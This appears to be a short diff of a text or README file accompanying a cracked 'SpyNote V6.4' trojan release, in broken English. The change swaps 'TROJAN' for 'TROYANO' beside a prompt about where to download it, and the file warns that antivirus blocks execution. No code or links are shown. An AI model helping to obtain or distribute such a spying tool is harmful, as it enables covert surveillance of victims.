@@ -5,7 +5,7 @@ SpyNote V6.4=Spy-Note v6 Setub instalet
 
 SpyNote-v6.4-Cracket-2021
 
-WHERE DO YOU WANT TO DOWNLOAD THE TROJAN?
+WHERE DO YOU WANT TO DOWNLOAD THE  TROYANO
 -----------------------------------------------
 ATTENTION THE PROGRAM IS A TROJAN
 THE ANTIVIRUS WILL NOT LET EXECUTION
